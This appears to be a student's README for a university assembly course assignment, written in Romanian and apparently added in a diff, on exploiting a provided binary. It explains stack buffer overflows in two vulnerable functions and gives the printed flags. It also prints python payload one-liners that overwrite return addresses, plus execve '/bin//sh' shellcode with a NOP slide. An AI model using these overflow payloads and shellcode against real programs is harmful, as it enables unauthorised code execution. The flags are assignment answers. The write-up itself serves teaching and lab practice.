@@ -1,0 +1,78 @@
+POPESCU LUCIAN IOAN 321CD TEMA3 IOCLA
+
+1. Analiza binarului
+--------------------
+
+Adresa functiei vulnerabile este 0x804866c.
+Aceasta functie este vulnerabila deoarece atunci cand se face apelul functiei
+read se citesc mai multi bytes decat sunt alocati pe stiva. In modul acesta
+se poate suprascrie continutul adresei $ebp+0xc care va fi mai apoi mutat
+in $eax si apelat.
+
+2. Spargerea binarului
+----------------------
+
+Pentru a printa flagul din enunt va trebui apelata subrutina de la adresa
+0x080485b1. Aceasta va performa diferite operatii pe un string de caractere
+care va fi mai apoi afisat cu ajutorul functiei puts. Acest string este chiar
+flagul dorit.
+
+Flag: NICE_FLAG{9a2405805ff832cc0b9ff9dc7698034c}
+Generare payload: python -c 'print "a"*0xb0 + "a"*0xa6 + "a"*0x13a + "a"*0x14b + "b"*0xc + "\xb1\x85\x04\x08"'
+
+3. Spargerea binarului v2
+-------------------------
+
+Adresa functiei vulnerabile este 0x80486dc.
+Aceasta functie este vulnerabila deoarece atunci cand se face apelul functiei
+read se citesc mai multi bytes decat sunt alocati pe stiva. In modul acesta
+se poate suprascrie continutul adresei $ebp+0x14 care va fi mai apoi mutat
+in $eax si apelat. E de mentionat ca trebuie pus la offseturile respective
+niste numere care o sa intre intr-un cmp pentru a trece la functia urmatoare.
+Aceste numere se regasesc de asemenea in payload, intre secventele de A si B.
+La finalul payloadului se afla noua adresa de return.
+
+Pentru a printa flagul din enunt va trebui apelata subrutina de la adresa
+0x080485b1. Aceasta va performa diferite operatii pe un string de caractere
+care va fi mai apoi afisat cu ajutorul functiei puts. Acest string este chiar
+flagul dorit.
+
+Flag: NAUGHTY_FLAG{de98dea79d59e5790b96a32c127cf716}
+Generare payload: python -c 'print "A"*0x7e + "\x91\x49\x49\xd6" + "B" + "A"*0x12d + "\x46\x9a\x77\xaa" + "B"*0xa9 + "A"*0x70 + "\xbf\x31\xc4\x0c" + "B"*0x18 + "A"*0x13b + "\x23\xe7\x1b\xa8" + "B"*0x2f + "A"*0x1f + "\xf2\x23\xa7\xce" + "B" *0x5c + "A"*0x7a + "\xd6\x02\x03\x03" + "B"*0x42 + "\xb1\x85\x04\x08"'
+
+4. Bonus - Shellcode
+--------------------
+
+Deoarece stackul e executabil(am observat asta folosind comanda 'checksec' in
+peda) putem scrie cod executabil pe stack la care vom sari la finalul functiei
+vulnerabile. Am adaugat si un nop slide pentru a nu sari direct la inceputul
+shellcodeului. Pe masina mea locala acesta incepe de la 0xffffca80 si se termina
+la 0xffffcad0, fiind urmat imediat de shellcode. Shellcode-ul l-am generat cu
+comanda assemble din peda si e format din urmatoarele instructiuni:
+
+xor eax, eax
+push eax ; null byte pentru stringul urmator
+push 0x68732f2f ; stringul '/bin//sh'
+push 0x6e69622f
+mov ebx, esp
+push eax
+push ebx
+mov ecx, esp
+lea edx, [esp + 0x4]
+mov al, 0xb
+int 0x80
+
+Ideea shellcode-ului e ca face apelul de sistem execve(0xb) pentru stringul
+"/bin//sh" cu argumentele potrivite in ebx, ecx si edx.
+Mai mult de atat a trebuit sa tin shellul deschis adaugand un 'cat' aditional
+la finalul shellcode-ului.
+
+Payload-ul a fost generat cu urmatoarea comanda:
+(python -c 'print "A"*0x7e + "\x91\x49\x49\xd6" + "B" + "A"*0x12d + "\x46\x9a\x77\xaa"+ "B"*0xa9 + "A"*0x70 + "\xbf\x31\xc4\x0c" + "B"*0x18 + "A"*0x13b + "\x23\xe7\x1b\xa8" + "B"*0x2f + "A"*0x1f+ "\xf2\x23\xa7\xce" + "\x90" *0x5c+ "\x90"*(20+0x4b) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x8d\x54\x24\x04\xb0\x0b\xcd\x80" + "\xd6\x02\x03\x03" + "B"*0x42 + "\x80\xca\xff\xff"'; cat)
+
+O problema pe care am intalnit-o atunci cand am generat acest payload a fost ca
+adresele din gdb nu erau aceleasi cu cele folosite la rularea programului in
+linia de comanda. Am rezolvat problema prin rularea programului cu o adresa de
+return aleatoare si analizarea core dumpului generat in urma segmentation
+fault-ului. Astfel am putut vedea unde se gaseste nop slide-ul si shellcode-ul
+in memoria binarului rulat fara ASLR activat.
